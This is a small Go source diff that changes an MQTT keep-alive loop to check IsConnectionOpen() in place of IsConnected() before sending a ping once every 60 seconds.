@@ -188,7 +188,7 @@ CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 
 	lastPingTime := time.Now()
 	for {
-		if burat.Internals().Mqtt.IsConnected() {
+		if burat.Internals().Mqtt.IsConnectionOpen() {
 			if time.Since(lastPingTime).Seconds() >= 60 {
 				burat.Ping()
 				lastPingTime = time.Now()
